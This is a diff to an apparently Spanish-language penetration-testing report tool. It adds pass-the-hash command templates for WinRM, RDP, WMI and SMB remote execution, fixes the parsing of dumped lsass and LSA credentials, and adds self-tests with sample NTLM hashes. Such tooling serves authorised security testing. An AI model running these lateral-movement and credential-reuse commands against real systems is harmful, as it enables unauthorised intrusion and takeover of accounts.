@@ -4255,6 +4255,7 @@ def fp_winrm(ip, ports, services, host, deep):
     _nxc_wpp = f" --port {_wp}" if _wp != 5985 else ""
     res["next"] += [
         f"evil-winrm -i {ip}{_ew_extra} -u USER -p PASS   # shell cuando tengas credenciales válidas",
+        f"evil-winrm -i {ip}{_ew_extra} -u USER -H HASH   # shell con hash NTLM (pass-the-hash)",
         f"nxc winrm {ip}{_nxc_wpp} -u users.txt -p pass.txt --continue-on-success   # validar lista de credenciales (manual)",
     ]
     return res
@@ -4325,7 +4326,10 @@ def fp_rdp(ip, ports, services, host, deep):
     for lbl, txt in _nse_for(services, host, ("rdp",)):
         _step(res, f"nmap {lbl}", True, txt,
               note="NLA/cifrado y datos NTLM (hostname, dominio, versión) que ya sacó nmap")
-    res["next"].append(f"xfreerdp /v:{ip} /u:USER /p:PASS +clipboard /cert:ignore   # conectar con credenciales")
+    res["next"] += [
+        f"xfreerdp /v:{ip} /u:USER /p:PASS +clipboard /cert:ignore   # conectar con credenciales",
+        f"xfreerdp /v:{ip} /u:USER /pth:HASH +clipboard /cert:ignore   # conectar con hash NTLM (pass-the-hash)",
+    ]
     return res
 
 
@@ -4468,7 +4472,9 @@ def fp_msrpc(ip, ports, services, host, deep):
             f"impacket-rpcdump {ip} | grep -iE 'MS-RPRN|MS-PAR|MS-EFSR|spool'   # ¿expone superficie de coacción NTLM? (PrinterBug/PetitPotam)")
     res["next"] += [
         f"impacket-wmiexec DOMINIO/USER:PASS@{ip}   # RCE por WMI — NECESITA admin LOCAL en el objetivo, NO basta una cuenta de dominio estándar (si no, 'rpc_s_access_denied'). DOMINIO/ opcional en un Windows suelto sin AD",
+        f"impacket-wmiexec -hashes :HASH DOMINIO/USER@{ip}   # RCE por WMI con hash NTLM (pass-the-hash) — mismos requisitos de admin local que arriba",
         f"nxc smb {ip} -u USER -p PASS -x whoami   # ejecución remota — también NECESITA admin local (si nxc no marcó '(Pwn3d!)' con esta cuenta, dará STATUS_ACCESS_DENIED)",
+        f"nxc smb {ip} -u USER -H HASH -x whoami   # ejecución remota con hash NTLM (pass-the-hash) — mismos requisitos de admin local que arriba",
     ]
     return res
 
@@ -7360,7 +7366,11 @@ def _parse_nxc_lsa(out):
             continue
         m = prefix_re.match(line)
         payload = m.group(1) if m else line.strip()
-        if not payload or payload.startswith("[*]") or payload.startswith("[+]"):
+        # Cualquier línea con marcador de nxc ('[*]'/'[+]'/'[-]'/'[!]'/'[OPSEC]'…), no solo
+        # '[*]'/'[+]' — mismo bug real que en _parse_lsassy: un banner de FALLO ('[-] dominio\
+        # user:secreto STATUS_LOGON_FAILURE') también puede colarse como si fuera un secreto
+        # 'dominio\\user:secreto STATUS_LOGON_FAILURE' real.
+        if not payload or payload.startswith("["):
             continue
         dm = re.match(r"^(dpapi_\w+):(0x[0-9a-fA-F]+)$", payload)
         if dm:
@@ -7416,7 +7426,23 @@ def _parse_lsassy(out):
     ('No credentials found'/'No Kerberos tickets found'/'No tickets were saved') no llevan
     '\\' y no casan con nada, así que no cuelan como credencial. Devuelve
     ([(usuario_completo, secreto, es_hash)], (nº_tickets, ruta_local) | None). Puro → testeable
-    sin red."""
+    sin red.
+
+    BUG REAL corregido aquí (operador real, pass-the-hash de Administrator tras un
+    backup_operator→DCSync: el pool de reutilización se llenaba de credenciales basura que
+    crecían cada ronda — 'Administrator:HASH:(Pwn3d!):STATUS_LOGON_FAILURE:STATUS_LOGON_FAILURE…'
+    hasta inundar Quick Wins de duplicados): nxc imprime SIEMPRE el banner de conexión/login
+    ANTES de la salida del propio módulo ('[+] dominio\\user:hash (Pwn3d!)' o, si falla,
+    '[-] dominio\\user:secreto STATUS_LOGON_FAILURE') — y el regex de credenciales de abajo no
+    distinguía esa línea de una línea REAL de lsassy (que nunca lleva '[…]' delante: su
+    print_credentials() usa context.log.highlight(), sin marcador de éxito/fallo). Contra
+    '[+] DOM\\Administrator:HASH (Pwn3d!)', el regex leía 'Administrator:HASH' entero como
+    'usuario' (al no haber espacio hasta el que cortar) y '(Pwn3d!)' como 'secreto' — esa basura
+    iba al pool, _reuse_chain la reprobaba (fallaba, claro), nxc imprimía OTRO banner de fallo con
+    ese mismo usuario-con-hash-incrustado, y la siguiente pasada por este mismo parser volvía a
+    leer ESA línea como 'nueva credencial', añadiendo un STATUS_LOGON_FAILURE más cada vez. Se
+    descartan aquí las líneas con marcador de nxc ('[+]'/'[-]'/'[*]'/'[!]'/'[OPSEC]'…) ANTES de
+    intentar el regex de credencial — ninguna línea real de lsassy empieza así."""
     creds, tickets = [], None
     for raw_line in (out or "").splitlines():
         line = raw_line.rstrip()
@@ -7427,6 +7453,8 @@ def _parse_lsassy(out):
         tm = _LSASSY_TICKETS_RE.search(payload)
         if tm:
             tickets = (int(tm.group(1)), tm.group(2).strip())
+            continue
+        if payload.startswith("["):   # banner de conexión/estado de nxc, NUNCA una credencial real
             continue
         cm = _LSASSY_CRED_RE.match(payload)
         if not cm:
@@ -9194,14 +9222,29 @@ def _pool_add(pool, user, secret, is_hash):
 def _stash_valid_cred(res, user, secret, is_hash, admin=False):
     """Guarda en `res` (footprint-dict) la credencial que ACABA de confirmarse válida de
     verdad (login real, no solo volcada/sugerida) — metadata interna que _fill_cred_placeholder
-    recoge más tarde para rellenar los next-steps con placeholder 'USER'/'PASS' de TODOS los
-    footprints del objetivo (bug real: con una credencial YA admin por WinRM en el mismo
-    informe, 'evil-winrm -i ip -u USER -p PASS' seguía con el placeholder sin tocar — ver
-    _fill_cred_placeholder). Solo contraseñas (is_hash=False): ninguno de esos next-steps
-    admite -H, y rellenar un hash ahí produciría un comando que no funciona. `admin=True`
-    cuando la credencial dio Pwn3d!/admin — gana sobre una simplemente 'válida' si hay varias
-    (ver _fill_cred_placeholder); no se sobrescribe una ya-admin con una que no lo es."""
-    if is_hash or not user:
+    recoge más tarde para rellenar los next-steps con placeholder 'USER'/'PASS' (contraseña) o
+    'USER'/'HASH' (pass-the-hash) de TODOS los footprints del objetivo (bug real: con una
+    credencial YA admin por WinRM en el mismo informe, 'evil-winrm -i ip -u USER -p PASS' seguía
+    con el placeholder sin tocar — ver _fill_cred_placeholder).
+
+    BUG REAL corregido aquí (operador real: Administrator con PASS-THE-HASH tras un
+    backup_operator→DCSync, Pwn3d! confirmado por LDAP/SMB/WINRM/WMI, pero el informe no daba
+    NINGÚN comando para conectarse — ni evil-winrm, ni wmiexec, ni xfreerdp): antes esta función
+    descartaba CUALQUIER credencial con is_hash=True sin más ('ninguno de esos next-steps admite
+    -H'), que era cierto para las plantillas de ENTONCES pero dejaba sin rellenar el caso más
+    común de post-explotación real en AD (DCSync/SAM dump → hash, no contraseña en claro). Ahora
+    se guarda aparte ('_valid_cred_hash'/'_valid_cred_hash_admin'), con sus PROPIAS plantillas de
+    next-step ('-H HASH'/'/pth:HASH'/'-hashes :HASH USER@' — ver fp_winrm/fp_rdp/fp_msrpc),
+    nunca mezclada con la de contraseña (cada plantilla admite SOLO una de las dos formas).
+    `admin=True` cuando la credencial dio Pwn3d!/admin — gana sobre una simplemente 'válida' si
+    hay varias (ver _fill_cred_placeholder); no se sobrescribe una ya-admin con una que no lo
+    sea, en NINGUNA de las dos vías (contraseña/hash) por separado."""
+    if not user:
+        return
+    if is_hash:
+        if admin or not res.get("_valid_cred_hash_admin"):
+            res["_valid_cred_hash"] = (user, secret)
+            res["_valid_cred_hash_admin"] = admin
         return
     if admin or not res.get("_valid_cred_admin"):
         res["_valid_cred"] = (user, secret)
@@ -10977,8 +11020,10 @@ def build_html(ip, services, host, footprints, vulns, domains, web_hits, vhosts,
                         else '<span class="miss"> ·genérico</span>')
             items.append(f'<div class="f"><span class="badge {w["sev"]}">{w["sev"].upper()}</span>'
                          f'<div style="flex:1"><div>{_h(w["title"])}{_lbl}</div>{cmds}{tip_html}</div></div>')
+        _qw_more = (f'<div class="f" style="opacity:.7">… y {len(wins) - 12} más '
+                    '(ver la sección de Hallazgos más abajo)</div>' if len(wins) > 12 else '')
         qw_html = (f'<h3 style="margin-top:0">★ Quick wins ({len(wins)})</h3>'
-                   '<div class="findings">' + "".join(items) + '</div>')
+                   '<div class="findings">' + "".join(items) + _qw_more + '</div>')
 
     # Índice (#9): enlaces de salto a cada sección. Orden visual: puertos → protocolos
     # footprinted → exploits → fuzzing → scripts de host. El JS abre el <details> destino
@@ -11069,6 +11114,8 @@ def build_markdown(ip, services, host, footprints, vulns, domains, web_hits, vho
                 L.append(f"  - `{c}`")
             if w.get("tip"):
                 L.append(f"  - 💡 {w['tip']}")
+        if len(wins) > 15:
+            L.append(f"- _… y {len(wins) - 15} más (ver la sección de Hallazgos más abajo)_")
         L.append("")
 
     all_findings = _all_findings(services, host, footprints, vulns)
@@ -12343,6 +12390,32 @@ def selftest():
     _, _ltk = _parse_lsassy("SMB  172.16.6.50  445  MS01  Saved 2 Kerberos ticket(s) to /home/op/.nxc/modules/lsassy\n")
     assert _ltk == (2, "/home/op/.nxc/modules/lsassy")
 
+    # Regresión REAL (operador real, pass-the-hash de Administrator tras backup_operator→DCSync):
+    # el banner de conexión/login de nxc ('[+] dominio\\user:hash (Pwn3d!)', SIEMPRE impreso antes
+    # de la salida del propio módulo) NO debe colarse como una credencial de lsassy — antes
+    # 'Administrator:HASH' se leía como 'usuario' y '(Pwn3d!)' como 'secreto', y esa basura
+    # terminaba en el pool de reutilización, creciendo cada ronda con un STATUS_LOGON_FAILURE más
+    # (visto en vivo: Quick Wins se llenó de docenas de duplicados con el mismo patrón).
+    _bo_lsassy_out = (
+        "SMB  10.0.0.1  445  DC01  [+] SOUPEDECODE.LOCAL\\Administrator:8982babd4da89d33210779a6c5b078bd (Pwn3d!)\n"
+        "SMB  10.0.0.1  445  DC01  [*] Dumping lsass with comsvcs method\n"
+        "SMB  10.0.0.1  445  DC01  No credentials found\n"
+    )
+    assert _parse_lsassy(_bo_lsassy_out) == ([], None), _parse_lsassy(_bo_lsassy_out)
+    # Un banner de FALLO (credencial garbage ya corrompida, reprobada por _reuse_chain) tampoco
+    # debe colarse — mismo patrón, con '[-] ... STATUS_LOGON_FAILURE' en vez de '[+] ... (Pwn3d!)'.
+    _bo_fail_out = "SMB  10.0.0.1  445  DC01  [-] SOUPEDECODE.LOCAL\\Administrator:8982babd...:(Pwn3d!) STATUS_LOGON_FAILURE\n"
+    assert _parse_lsassy(_bo_fail_out) == ([], None), _parse_lsassy(_bo_fail_out)
+    # Pero una credencial REAL de lsassy (sin marcador de nxc delante) sigue colando con
+    # normalidad — el fix no debe volverse tan agresivo que descarte hallazgos genuinos.
+    _bo_real_cred = "SMB  10.0.0.1  445  DC01  SOUPEDECODE.LOCAL\\svc_backup Sup3rS3cr3t!\n"
+    assert _parse_lsassy(_bo_real_cred) == ([("SOUPEDECODE.LOCAL\\svc_backup", "Sup3rS3cr3t!", False)], None)
+
+    # Mismo bug, mismo fix, en _parse_nxc_lsa (--lsa): un banner con marcador de nxc no debe
+    # colarse como credencial 'creds' aunque tenga forma 'algo:algo'.
+    _lsa_banner_out = "SMB  10.0.0.1  445  DC01  [-] SOUPEDECODE.LOCAL\\Administrator:garbage STATUS_LOGON_FAILURE\n"
+    assert _parse_nxc_lsa(_lsa_banner_out)["creds"] == []
+
     # roasting (nxc --asreproast/--kerberoasting) y spider de contenido: parsers puros (sin red)
     assert _count_roast("$krb5asrep$23$u@DOM:abc\n$krb5tgs$23$*svc$DOM$def") == 2
     assert _count_roast("sin hashes") == 0
@@ -13599,14 +13672,16 @@ def selftest():
     _pool_add(_ppnul, "usuario_sano", "secreto_normal", False)
     assert len(_ppnul) == 1
 
-    # _stash_valid_cred: solo contraseñas (is_hash=False descarta un hash — ninguno de los
-    # next-steps con placeholder USER/PASS admite -H), y una credencial admin NO se deja
-    # pisar por una simplemente válida llegada después (pero si no hay admin, la última gana).
+    # _stash_valid_cred: contraseña y hash se guardan APARTE (_valid_cred/_valid_cred_hash — cada
+    # una con sus propias plantillas de next-step, ver _fill_cred_placeholder), nunca mezcladas;
+    # una credencial admin NO se deja pisar por una simplemente válida llegada después (pero si no
+    # hay admin, la última gana) — la misma regla se aplica a cada vía por separado.
     _svc_res = _fp("reuse-smb", "x", [445])
     _stash_valid_cred(_svc_res, "bob", "hunter2", False)              # válida normal
     assert _svc_res["_valid_cred"] == ("bob", "hunter2") and _svc_res["_valid_cred_admin"] is False
-    _stash_valid_cred(_svc_res, "hashuser", "aad3b435b51404ee", True)  # hash → NO pisa (is_hash)
+    _stash_valid_cred(_svc_res, "hashuser", "aad3b435b51404ee", True)  # hash → va a _valid_cred_hash, NO toca _valid_cred
     assert _svc_res["_valid_cred"] == ("bob", "hunter2")
+    assert _svc_res["_valid_cred_hash"] == ("hashuser", "aad3b435b51404ee") and _svc_res["_valid_cred_hash_admin"] is False
     _stash_valid_cred(_svc_res, "alice", "Sup3rS3cur3", False, admin=False)  # no-admin → SÍ pisa (no hay admin aún)
     assert _svc_res["_valid_cred"] == ("alice", "Sup3rS3cur3")
     _stash_valid_cred(_svc_res, "root_admin", "Adm1nPass", False, admin=True)  # admin → gana
@@ -13644,6 +13719,35 @@ def selftest():
     assert not any("svc_sql" in n for n in _fc_anon["next"])     # gana AB920 (admin), no svc_sql (no-admin)
     for _fpr in _fc_fps:                                          # metadata interna NUNCA filtra al informe
         assert "_valid_cred" not in _fpr and "_valid_cred_admin" not in _fpr
+        assert "_valid_cred_hash" not in _fpr and "_valid_cred_hash_admin" not in _fpr
+
+    # Pass-the-hash (operator-reported: Administrator con -H tras backup_operator→DCSync, Pwn3d!
+    # confirmado por LDAP/SMB/WINRM/WMI, pero el informe no daba NINGÚN comando para conectarse —
+    # ni evil-winrm, ni wmiexec, ni xfreerdp — porque _stash_valid_cred descartaba CUALQUIER hash
+    # sin más). Cubre las 4 plantillas reales con hash: '-u USER -H HASH' (evil-winrm/nxc smb -x),
+    # '/u:USER /pth:HASH' (xfreerdp) y '-hashes :HASH DOMINIO/USER@' (impacket-wmiexec, el único
+    # con el hash y el usuario en partes SEPARADAS del comando, no pegadas como 'USER:PASS').
+    _fh_anon = _fp("winrm", "WinRM", [5985])
+    _fh_anon["next"] = [
+        "evil-winrm -i 172.16.7.50 -u USER -p PASS   # shell cuando tengas credenciales válidas",
+        "evil-winrm -i 172.16.7.50 -u USER -H HASH   # shell con hash NTLM (pass-the-hash)",
+        "impacket-wmiexec DOMINIO/USER:PASS@172.16.7.50   # RCE por WMI",
+        "impacket-wmiexec -hashes :HASH DOMINIO/USER@172.16.7.50   # RCE por WMI con hash NTLM (pass-the-hash)",
+        "xfreerdp /v:172.16.7.50 /u:USER /p:PASS +clipboard /cert:ignore   # conectar con credenciales",
+        "xfreerdp /v:172.16.7.50 /u:USER /pth:HASH +clipboard /cert:ignore   # conectar con hash NTLM (pass-the-hash)",
+        "nxc smb 172.16.7.50 -u USER -H HASH -x whoami   # ejecución remota con hash NTLM",
+    ]
+    _fh_admin = _fp("reuse-ldap", "x", [389])
+    _stash_valid_cred(_fh_admin, "Administrator", "8982babd4da89d33210779a6c5b078bd", True, admin=True)
+    _fill_cred_placeholder([_fh_anon, _fh_admin])
+    assert _fh_anon["next"][0] == "evil-winrm -i 172.16.7.50 -u USER -p PASS   # shell cuando tengas credenciales válidas"   # sin credencial de CONTRASEÑA en este test, la plantilla queda intacta
+    assert _fh_anon["next"][1] == "evil-winrm -i 172.16.7.50 -u Administrator -H 8982babd4da89d33210779a6c5b078bd   # shell con hash NTLM (pass-the-hash)", _fh_anon["next"][1]
+    assert "DOMINIO/USER:PASS@" in _fh_anon["next"][2]   # intacta: sin credencial de contraseña en este test
+    assert _fh_anon["next"][3] == "impacket-wmiexec -hashes :8982babd4da89d33210779a6c5b078bd DOMINIO/Administrator@172.16.7.50   # RCE por WMI con hash NTLM (pass-the-hash)", _fh_anon["next"][3]
+    assert "/u:Administrator /pth:8982babd4da89d33210779a6c5b078bd" in _fh_anon["next"][5], _fh_anon["next"][5]
+    assert _fh_anon["next"][6] == "nxc smb 172.16.7.50 -u Administrator -H 8982babd4da89d33210779a6c5b078bd -x whoami   # ejecución remota con hash NTLM", _fh_anon["next"][6]
+    for _fpr in (_fh_anon, _fh_admin):
+        assert "_valid_cred_hash" not in _fpr and "_valid_cred_hash_admin" not in _fpr
     # #70: una contraseña con ESPACIO/'/$ se quota en TODAS las formas (xfreerdp/SOAPy/impacket),
     # no solo en -u/-p — antes rompía esos comandos al pegarlos.
     _fc70 = {"proto": "winrm", "ports": [5985], "steps": [], "findings": [], "missing": [],
@@ -15363,6 +15467,21 @@ def selftest():
                                "2026-01-01 00:00", preliminary=True, no_fuzz=True)
     assert "--no-fuzz" in md_pre_nf
     assert "fuzzing web/vhost" not in md_pre_nf and "sigue en marcha" not in md_pre_nf
+
+    # Regresión REAL (operador real: "pone que había 32 quick wins pero salen menos"): las 3
+    # vistas (terminal/HTML/Markdown) recortan la lista de Quick Wins (12/12/15) pero la
+    # CABECERA siempre muestra el total sin recortar — sin avisar de los que faltan, parecía que
+    # el informe se había comido hallazgos. El terminal (render_quick_wins) ya avisaba ("… y N
+    # más"); HTML y Markdown no.
+    _many_fprs = [{"proto": f"svc{i}", "title": f"SVC{i}", "ports": [], "steps": [],
+                   "findings": [("critica", f"hallazgo crítico número {i}")], "next": [], "missing": []}
+                  for i in range(20)]
+    _doc_many = build_html("10.0.0.1", [], {}, _many_fprs, [], [], {}, [], None, "2026-01-01 00:00")
+    assert "★ Quick wins (20)" in _doc_many, _doc_many
+    assert "… y 8 más" in _doc_many, _doc_many   # 20 - 12 = 8
+    _md_many = build_markdown("10.0.0.1", [], {}, _many_fprs, [], [], {}, [], None, "2026-01-01 00:00")
+    assert "## ★ Quick wins (20)" in _md_many, _md_many
+    assert "… y 5 más" in _md_many, _md_many     # 20 - 15 = 5
     assert "recon en curso" in md_pre_nf and "fuzzing en curso" not in md_pre_nf
 
     # Orden de severidad (crítica primero) y utilidades nuevas, sin tocar la red
@@ -17567,26 +17686,45 @@ def _fill_cred_placeholder(footprints):
     se le hace pop() aquí (nunca llega al HTML/findings.json, mismo patrón que
     _signing_disabled/_coerce de _combine_relay_opportunity)."""
     best, best_admin = None, False
+    best_hash, best_hash_admin = None, False
     for fpr in footprints:
         cred = fpr.pop("_valid_cred", None)
         admin = fpr.pop("_valid_cred_admin", False)
         if cred and (best is None or (admin and not best_admin)):
             best, best_admin = cred, admin
-    if not best:
+        cred_h = fpr.pop("_valid_cred_hash", None)
+        admin_h = fpr.pop("_valid_cred_hash_admin", False)
+        if cred_h and (best_hash is None or (admin_h and not best_hash_admin)):
+            best_hash, best_hash_admin = cred_h, admin_h
+    if not best and not best_hash:
         return
-    user, secret = best
     # shlex.quote en TODAS las formas (no solo '-u/-p'): una contraseña con espacio/comilla/$ dejaba
     # el comando roto en las formas '/u:.. /p:..' (xfreerdp), "USER:'PASS'" (SOAPy) y 'USER:PASS'
     # (URL impacket), que insertaban user/secret CRUDOS. Con quoting, el shell entrega el argumento
     # intacto (impacket/SOAPy ya lo parsean). El orden importa: "USER:'PASS'" antes que "USER:PASS"
     # (esta última no es subcadena de la primera, pero se mantiene el orden por claridad) (#70).
-    uq, pq = shlex.quote(user), (shlex.quote(secret) if secret else "''")
-    for fpr in footprints:
-        fpr["next"] = [n.replace("-u USER -p PASS", f"-u {uq} -p {pq}")
-                         .replace("/u:USER /p:PASS", f"/u:{uq} /p:{pq}")
-                         .replace("USER:'PASS'", f"{uq}:{pq}")
-                         .replace("USER:PASS", f"{uq}:{pq}")
-                        for n in fpr["next"]]
+    if best:
+        user, secret = best
+        uq, pq = shlex.quote(user), (shlex.quote(secret) if secret else "''")
+        for fpr in footprints:
+            fpr["next"] = [n.replace("-u USER -p PASS", f"-u {uq} -p {pq}")
+                             .replace("/u:USER /p:PASS", f"/u:{uq} /p:{pq}")
+                             .replace("USER:'PASS'", f"{uq}:{pq}")
+                             .replace("USER:PASS", f"{uq}:{pq}")
+                            for n in fpr["next"]]
+    # Pass-the-hash: plantillas APARTE ('-u USER -H HASH'/'/u:USER /pth:HASH'/'-hashes :HASH
+    # ...USER@'), nunca las mismas que la contraseña (cada herramienta usa un flag DISTINTO para
+    # hash, no solo un valor distinto en el mismo flag — ver _stash_valid_cred). 'DOMINIO' (si lo
+    # hay) ya se rellenó antes por _fill_domain_placeholder, así que aquí solo toca USER/HASH.
+    if best_hash:
+        huser, hsecret = best_hash
+        huq, hhq = shlex.quote(huser), (shlex.quote(hsecret) if hsecret else "''")
+        for fpr in footprints:
+            fpr["next"] = [n.replace("-u USER -H HASH", f"-u {huq} -H {hhq}")
+                             .replace("/u:USER /pth:HASH", f"/u:{huq} /pth:{hhq}")
+                             .replace("-hashes :HASH", f"-hashes :{hhq}")
+                             .replace("USER@", f"{huq}@")
+                            for n in fpr["next"]]
 
 
 def _combine_relay_opportunity(footprints, ip):
